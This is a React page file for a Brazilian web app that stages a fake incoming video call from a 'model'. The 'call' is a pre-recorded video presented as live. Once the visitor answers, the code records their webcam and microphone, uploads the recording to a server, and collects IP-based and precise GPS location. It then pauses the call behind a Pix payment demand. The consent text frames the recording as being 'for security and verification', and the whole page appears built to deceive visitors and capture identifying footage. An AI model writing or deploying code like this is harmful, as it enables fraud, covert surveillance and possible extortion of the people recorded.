import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { supabase } from "@/integrations/supabase/client";
import {
  startCallSession,
  endFreeCall,
  completeCall,
  createPixPayment,
  checkPayment,
  saveGeolocation,
  getRecordingUploadUrl,
} from "@/lib/call.functions";
import { toast } from "sonner";
import { Mic, MicOff, Video, VideoOff, PhoneOff, Copy, Phone } from "lucide-react";

type Settings = {
  model_name: string;
  model_photo_url: string | null;
  video_url: string | null;
  free_duration_seconds: number;
  price_cents: number;
  offer_title: string;
  offer_subtitle: string;
  contact_url: string | null;
};

type Phase =
  | "ringing"
  | "requesting"
  | "denied"
  | "in_call"
  | "offer"
  | "paying"
  | "finished";

export const Route = createFileRoute("/call")({
  component: CallPage,
  head: () => ({
    meta: [
      { title: "Chamada recebida" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
});

function formatTime(totalSeconds: number) {
  const m = Math.floor(totalSeconds / 60).toString().padStart(2, "0");
  const s = Math.floor(totalSeconds % 60).toString().padStart(2, "0");
  return `${m}:${s}`;
}

function formatBRL(cents: number) {
  return (cents / 100).toLocaleString("pt-BR", {
    style: "currency",
    currency: "BRL",
  });
}

function pickRecorderMime() {
  if (typeof MediaRecorder === "undefined") return "";
  const candidates = [
    "video/webm;codecs=vp9,opus",
    "video/webm;codecs=vp8,opus",
    "video/webm",
    "video/mp4",
  ];
  for (const m of candidates) {
    if (MediaRecorder.isTypeSupported(m)) return m;
  }
  return "";
}

function CallPage() {
  const [settings, setSettings] = useState<Settings | null>(null);
  const [phase, setPhase] = useState<Phase>("ringing");
  const [consent, setConsent] = useState(false);
  const [micOn, setMicOn] = useState(true);
  const [camOn, setCamOn] = useState(true);
  const [elapsed, setElapsed] = useState(0);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentInfo, setPaymentInfo] = useState<{
    paymentId: string;
    configured: boolean;
    qrCode?: string;
    qrCodeBase64?: string;
    ticketUrl?: string;
    amountCents: number;
  } | null>(null);

  const modelVideoRef = useRef<HTMLVideoElement | null>(null);
  const leadVideoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const uploadedRef = useRef(false);
  const freeEndedRef = useRef(false);
  const sessionIdRef = useRef<string | null>(null);

  const startCallFn = useServerFn(startCallSession);
  const endFreeFn = useServerFn(endFreeCall);
  const completeFn = useServerFn(completeCall);
  const createPixFn = useServerFn(createPixPayment);
  const checkPayFn = useServerFn(checkPayment);
  const saveGeoFn = useServerFn(saveGeolocation);
  const getUploadUrlFn = useServerFn(getRecordingUploadUrl);

  useEffect(() => {
    sessionIdRef.current = sessionId;
  }, [sessionId]);

  // Load settings
  useEffect(() => {
    supabase
      .from("settings")
      .select(
        "model_name, model_photo_url, video_url, free_duration_seconds, price_cents, offer_title, offer_subtitle, contact_url",
      )
      .eq("id", 1)
      .single()
      .then(({ data, error }) => {
        if (error) {
          console.error(error);
          return;
        }
        setSettings(data as Settings);
      });
  }, []);

  // Fix camera bug: attach stream to <video> whenever the element mounts (phase changes)
  useEffect(() => {
    const el = leadVideoRef.current;
    const s = streamRef.current;
    if (el && s && el.srcObject !== s) {
      el.srcObject = s;
      el.play().catch(() => {});
    }
  }, [phase]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      streamRef.current?.getTracks().forEach((t) => t.stop());
      if (recorderRef.current && recorderRef.current.state !== "inactive") {
        try {
          recorderRef.current.stop();
        } catch {
          /* noop */
        }
      }
    };
  }, []);

  // Timer
  useEffect(() => {
    if (phase !== "in_call") return;
    const start = Date.now() - elapsed * 1000;
    const iv = setInterval(() => {
      setElapsed(Math.floor((Date.now() - start) / 1000));
    }, 250);
    return () => clearInterval(iv);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [phase]);

  // Free-call timeout
  useEffect(() => {
    if (phase !== "in_call" || !settings || !sessionId) return;
    if (freeEndedRef.current) return;
    if (elapsed >= settings.free_duration_seconds) {
      freeEndedRef.current = true;
      modelVideoRef.current?.pause();
      setPhase("offer");
      endFreeFn({ data: { sessionId } }).catch(console.error);
    }
  }, [elapsed, phase, settings, sessionId, endFreeFn]);

  // Upload the recording blob (called at hang up / video end)
  const uploadRecording = useCallback(async () => {
    if (uploadedRef.current) return;
    const sid = sessionIdRef.current;
    const chunks = chunksRef.current;
    if (!sid || chunks.length === 0) return;
    uploadedRef.current = true;
    const recorder = recorderRef.current;
    const type = recorder?.mimeType || "video/webm";
    const ext = type.includes("mp4") ? "mp4" : "webm";
    const blob = new Blob(chunks, { type });
    try {
      const { signedUrl } = await getUploadUrlFn({
        data: { sessionId: sid, ext },
      });
      await fetch(signedUrl, {
        method: "PUT",
        headers: { "Content-Type": type, "x-upsert": "true" },
        body: blob,
      });
    } catch (err) {
      console.error("upload failed", err);
      uploadedRef.current = false;
    }
  }, [getUploadUrlFn]);

  // Answer button — tapping "Atender" is itself the consent
  const handleAnswer = useCallback(async () => {
    if (!settings) return;
    setConsent(true);
    setPhase("requesting");
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
        audio: true,
      });
      streamRef.current = stream;

      // Start server session with consent flag + IP-derived geo
      const { sessionId: sid } = await startCallFn({ data: { consent: true } });
      setSessionId(sid);
      sessionIdRef.current = sid;

      // Ask for precise geolocation (best-effort)
      if (typeof navigator !== "undefined" && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            saveGeoFn({
              data: {
                sessionId: sid,
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              },
            }).catch(console.error);
          },
          () => {
            /* denied — server already has IP-based geo */
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 },
        );
      }

      // Start MediaRecorder
      const mimeType = pickRecorderMime();
      try {
        const recorder = new MediaRecorder(
          stream,
          mimeType ? { mimeType, bitsPerSecond: 800_000 } : undefined,
        );
        recorderRef.current = recorder;
        chunksRef.current = [];
        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) chunksRef.current.push(e.data);
        };
        recorder.onstop = () => {
          uploadRecording();
        };
        recorder.start(1000);
      } catch (err) {
        console.warn("MediaRecorder not supported", err);
      }

      // Start model video
      if (modelVideoRef.current) {
        modelVideoRef.current.muted = false;
        modelVideoRef.current.currentTime = 0;
        await modelVideoRef.current.play().catch(() => {});
      }
      setPhase("in_call");
    } catch (err) {
      console.error(err);
      setPhase("denied");
    }
  }, [settings, consent, startCallFn, saveGeoFn, uploadRecording]);

  // Mic toggle (kept enabled for recorder even when muted for the call)
  const toggleMic = useCallback(() => {
    const stream = streamRef.current;
    if (!stream) return;
    const next = !micOn;
    stream.getAudioTracks().forEach((t) => (t.enabled = next));
    setMicOn(next);
  }, [micOn]);

  const toggleCam = useCallback(() => {
    const stream = streamRef.current;
    if (!stream) return;
    const next = !camOn;
    stream.getVideoTracks().forEach((t) => (t.enabled = next));
    setCamOn(next);
  }, [camOn]);

  const finalize = useCallback(async () => {
    // stop recorder first so onstop uploads
    const rec = recorderRef.current;
    if (rec && rec.state !== "inactive") {
      try {
        rec.stop();
      } catch {
        /* noop */
      }
    } else {
      uploadRecording();
    }
    // Give the recorder a tick to flush
    await new Promise((r) => setTimeout(r, 200));
    streamRef.current?.getTracks().forEach((t) => t.stop());
    modelVideoRef.current?.pause();
    const sid = sessionIdRef.current;
    if (sid) {
      await completeFn({ data: { sessionId: sid } }).catch(console.error);
    }
  }, [completeFn, uploadRecording]);

  const hangUp = useCallback(async () => {
    await finalize();
    setPhase("finished");
  }, [finalize]);

  const handleVideoEnded = useCallback(async () => {
    await finalize();
    setPhase("finished");
  }, [finalize]);

  const startPayment = useCallback(async () => {
    if (!sessionId) return;
    setPhase("paying");
    try {
      const res = await createPixFn({ data: { sessionId } });
      setPaymentInfo(res);
    } catch (err) {
      console.error(err);
      toast.error("Não foi possível gerar o Pix agora. Tenta de novo.");
      setPhase("offer");
    }
  }, [sessionId, createPixFn]);

  useEffect(() => {
    if (phase !== "paying" || !paymentInfo?.configured) return;
    let cancelled = false;
    const poll = async () => {
      while (!cancelled) {
        try {
          const { status } = await checkPayFn({
            data: { paymentId: paymentInfo.paymentId },
          });
          if (cancelled) return;
          if (status === "approved") {
            freeEndedRef.current = false;
            streamRef.current?.getVideoTracks().forEach((t) => (t.enabled = camOn));
            streamRef.current?.getAudioTracks().forEach((t) => (t.enabled = micOn));
            await modelVideoRef.current?.play().catch(() => {});
            if (settings) {
              setSettings({
                ...settings,
                free_duration_seconds: Number.MAX_SAFE_INTEGER,
              });
            }
            setPhase("in_call");
            return;
          }
          if (status === "rejected" || status === "cancelled") {
            toast.error("Pagamento não aprovado.");
            setPhase("offer");
            return;
          }
        } catch (err) {
          console.error(err);
        }
        await new Promise((r) => setTimeout(r, 3000));
      }
    };
    poll();
    return () => {
      cancelled = true;
    };
  }, [phase, paymentInfo, checkPayFn, camOn, micOn, settings]);

  const copyPix = useCallback(() => {
    if (!paymentInfo?.qrCode) return;
    navigator.clipboard.writeText(paymentInfo.qrCode);
    toast.success("Código Pix copiado");
  }, [paymentInfo]);

  const modelName = settings?.model_name ?? "Modelo";
  const price = formatBRL(paymentInfo?.amountCents ?? settings?.price_cents ?? 3000);
  const initial = useMemo(() => modelName.charAt(0).toUpperCase(), [modelName]);

  return (
    <div className="fixed inset-0 overflow-hidden bg-black text-white">
      {settings?.video_url ? (
        <video
          ref={modelVideoRef}
          src={settings.video_url}
          playsInline
          preload="auto"
          onEnded={handleVideoEnded}
          className={`absolute inset-0 h-full w-full object-cover transition-opacity duration-500 ${
            phase === "in_call" || phase === "offer" || phase === "paying"
              ? "opacity-100"
              : "opacity-0"
          }`}
        />
      ) : null}

      <div className="pointer-events-none absolute inset-x-0 top-0 h-40 bg-gradient-to-b from-black/70 to-transparent" />
      <div className="pointer-events-none absolute inset-x-0 bottom-0 h-56 bg-gradient-to-t from-black/80 to-transparent" />

      {phase === "ringing" ? (
        <div className="absolute inset-0 flex flex-col items-center justify-between py-14">
          <div className="flex flex-col items-center gap-4">
            <div className="text-sm uppercase tracking-widest text-white/60">
              Chamada de vídeo
            </div>
            <ModelAvatar
              name={modelName}
              photo={settings?.model_photo_url ?? null}
              initial={initial}
              pulsing
            />
            <div className="text-3xl font-semibold">{modelName}</div>
            <div className="animate-pulse text-sm text-white/70">chamando...</div>
          </div>

          <div className="flex w-full flex-col items-center gap-6 px-6">
            <label className="flex max-w-xs items-start gap-3 rounded-2xl border border-white/10 bg-black/50 p-3 text-left text-xs text-white/80 backdrop-blur">
              <input
                type="checkbox"
                checked={consent}
                onChange={(e) => setConsent(e.target.checked)}
                className="mt-0.5 h-4 w-4 accent-emerald-500"
              />
              <span>
                Autorizo a gravação de vídeo, áudio e localização durante esta
                chamada para fins de segurança e verificação.
              </span>
            </label>

            <div className="flex w-full items-center justify-around">
              <button
                onClick={() => setPhase("finished")}
                className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
                aria-label="Recusar"
              >
                <PhoneOff className="h-7 w-7" />
              </button>
              <button
                onClick={handleAnswer}
                disabled={!consent}
                className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 shadow-lg shadow-emerald-500/40 transition active:scale-95 disabled:opacity-40"
                aria-label="Atender"
              >
                <Phone className="h-7 w-7" />
              </button>
            </div>
          </div>
        </div>
      ) : null}

      {phase === "requesting" ? (
        <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 bg-black/80 px-8 text-center">
          <div className="h-12 w-12 animate-spin rounded-full border-4 border-white/20 border-t-emerald-500" />
          <div className="text-lg font-medium">Conectando…</div>
          <div className="text-sm text-white/60">
            Permita o acesso à câmera, ao microfone e à localização
          </div>
        </div>
      ) : null}

      {phase === "denied" ? (
        <div className="absolute inset-0 flex flex-col items-center justify-center gap-6 bg-black px-8 text-center">
          <VideoOff className="h-14 w-14 text-red-500" />
          <div className="max-w-xs">
            <div className="text-xl font-semibold">Sem permissão</div>
            <div className="mt-2 text-sm text-white/70">
              Pra continuar a chamada você precisa liberar câmera e microfone.
              Habilite nas configurações do navegador e tente de novo.
            </div>
          </div>
          <button
            onClick={handleAnswer}
            className="rounded-full bg-emerald-500 px-6 py-3 text-sm font-medium"
          >
            Tentar novamente
          </button>
        </div>
      ) : null}

      {phase === "in_call" || phase === "offer" || phase === "paying" ? (
        <>
          <div className="absolute inset-x-0 top-0 z-10 flex items-center justify-between px-5 pt-8">
            <div className="flex items-center gap-3">
              <ModelAvatar
                name={modelName}
                photo={settings?.model_photo_url ?? null}
                initial={initial}
                small
              />
              <div>
                <div className="text-sm font-semibold">{modelName}</div>
                <div className="text-xs text-white/70">{formatTime(elapsed)}</div>
              </div>
            </div>
            <div className="flex items-center gap-1 rounded-full bg-red-500/90 px-2 py-1 text-[10px] font-medium">
              <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-white" />
              REC
            </div>
          </div>

          <div className="absolute right-4 top-24 z-10 h-40 w-28 overflow-hidden rounded-2xl border border-white/10 bg-black shadow-2xl">
            <video
              ref={leadVideoRef}
              autoPlay
              muted
              playsInline
              className={`h-full w-full object-cover transition-opacity ${
                camOn ? "opacity-100" : "opacity-0"
              }`}
            />
            {!camOn ? (
              <div className="absolute inset-0 flex items-center justify-center bg-neutral-900">
                <VideoOff className="h-6 w-6 text-white/60" />
              </div>
            ) : null}
          </div>

          {phase === "in_call" ? (
            <div className="absolute inset-x-0 bottom-0 z-10 flex items-center justify-around px-8 pb-12">
              <ControlButton
                active={micOn}
                onClick={toggleMic}
                label={micOn ? "Mutar" : "Ativar mic"}
                icon={micOn ? <Mic className="h-6 w-6" /> : <MicOff className="h-6 w-6" />}
              />
              <button
                onClick={hangUp}
                className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
                aria-label="Encerrar"
              >
                <PhoneOff className="h-7 w-7" />
              </button>
              <ControlButton
                active={camOn}
                onClick={toggleCam}
                label={camOn ? "Câmera off" : "Câmera on"}
                icon={
                  camOn ? <Video className="h-6 w-6" /> : <VideoOff className="h-6 w-6" />
                }
              />
            </div>
          ) : null}

          {phase === "offer" ? (
            <div className="absolute inset-0 z-20 flex flex-col items-center justify-center gap-5 bg-black/85 px-6 text-center backdrop-blur-md">
              <div className="text-xs uppercase tracking-widest text-white/50">
                Chamada pausada
              </div>
              <div className="max-w-sm text-2xl font-bold">
                {settings?.offer_title ?? "Continue a chamada"}
              </div>
              <div className="max-w-xs text-sm text-white/70">
                {settings?.offer_subtitle}
              </div>
              <div className="mt-2 text-4xl font-bold text-emerald-400">{price}</div>
              <button
                onClick={startPayment}
                className="mt-4 w-full max-w-xs rounded-full bg-emerald-500 py-4 text-base font-semibold shadow-lg shadow-emerald-500/30 transition active:scale-95"
              >
                Pagar com Pix
              </button>
              <button
                onClick={hangUp}
                className="text-sm text-white/60 underline underline-offset-4"
              >
                Encerrar chamada
              </button>
            </div>
          ) : null}

          {phase === "paying" ? (
            <div className="absolute inset-0 z-20 flex flex-col items-center justify-center gap-4 overflow-y-auto bg-black/90 px-6 py-8 text-center backdrop-blur-md">
              {!paymentInfo ? (
                <>
                  <div className="h-10 w-10 animate-spin rounded-full border-4 border-white/20 border-t-emerald-500" />
                  <div className="text-sm text-white/70">Gerando cobrança…</div>
                </>
              ) : !paymentInfo.configured ? (
                <>
                  <div className="text-lg font-semibold">Pagamento em configuração</div>
                  <div className="max-w-xs text-sm text-white/60">
                    O Pix ainda não está ativo. Peça ao administrador para
                    conectar o Mercado Pago.
                  </div>
                  <button
                    onClick={() => setPhase("offer")}
                    className="mt-4 rounded-full bg-white/10 px-6 py-2 text-sm"
                  >
                    Voltar
                  </button>
                </>
              ) : (
                <>
                  <div className="text-base font-semibold">
                    Pague {price} pra continuar
                  </div>
                  {paymentInfo.qrCodeBase64 ? (
                    <img
                      src={`data:image/png;base64,${paymentInfo.qrCodeBase64}`}
                      alt="QR Code Pix"
                      className="h-56 w-56 rounded-xl border-4 border-white bg-white"
                    />
                  ) : null}
                  <div className="w-full max-w-sm">
                    <div className="text-xs text-white/50">Copia e cola</div>
                    <div className="mt-1 max-h-24 overflow-y-auto break-all rounded-lg bg-white/5 p-3 text-xs">
                      {paymentInfo.qrCode}
                    </div>
                    <button
                      onClick={copyPix}
                      className="mt-2 inline-flex items-center gap-2 rounded-full bg-white/10 px-4 py-2 text-xs"
                    >
                      <Copy className="h-3.5 w-3.5" /> Copiar código
                    </button>
                  </div>
                  <div className="mt-1 flex items-center gap-2 text-xs text-white/60">
                    <div className="h-2 w-2 animate-pulse rounded-full bg-emerald-400" />
                    Aguardando pagamento…
                  </div>
                  <button
                    onClick={() => setPhase("offer")}
                    className="text-xs text-white/50 underline underline-offset-4"
                  >
                    Cancelar
                  </button>
                </>
              )}
            </div>
          ) : null}
        </>
      ) : null}

      {phase === "finished" ? (
        <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 bg-black px-8 text-center">
          <ModelAvatar
            name={modelName}
            photo={settings?.model_photo_url ?? null}
            initial={initial}
          />
          <div className="text-xl font-semibold">Chamada encerrada</div>
          <div className="text-sm text-white/60">Duração {formatTime(elapsed)}</div>
          {settings?.contact_url ? (
            <a
              href={settings.contact_url}
              target="_blank"
              rel="noopener noreferrer"
              className="mt-4 rounded-full bg-emerald-500 px-6 py-3 text-sm font-semibold"
            >
              Falar novamente
            </a>
          ) : null}
        </div>
      ) : null}
    </div>
  );
}

function ControlButton({
  active,
  onClick,
  label,
  icon,
}: {
  active: boolean;
  onClick: () => void;
  label: string;
  icon: React.ReactNode;
}) {
  return (
    <button
      onClick={onClick}
      aria-label={label}
      className={`flex h-14 w-14 items-center justify-center rounded-full transition active:scale-95 ${
        active ? "bg-white/15 backdrop-blur" : "bg-white text-black"
      }`}
    >
      {icon}
    </button>
  );
}

function ModelAvatar({
  name,
  photo,
  initial,
  small,
  pulsing,
}: {
  name: string;
  photo: string | null;
  initial: string;
  small?: boolean;
  pulsing?: boolean;
}) {
  const size = small ? "h-10 w-10 text-sm" : "h-32 w-32 text-5xl";
  return (
    <div
      className={`relative overflow-hidden rounded-full bg-gradient-to-br from-emerald-500 to-emerald-700 ${size} ${
        pulsing ? "shadow-2xl shadow-emerald-500/40" : ""
      }`}
    >
      {pulsing ? (
        <span className="absolute inset-0 animate-ping rounded-full bg-emerald-500/30" />
      ) : null}
      {photo ? (
        <img src={photo} alt={name} className="relative h-full w-full object-cover" />
      ) : (
        <div className="relative flex h-full w-full items-center justify-center font-semibold text-white">
          {initial}
        </div>
      )}
    </div>
  );
}
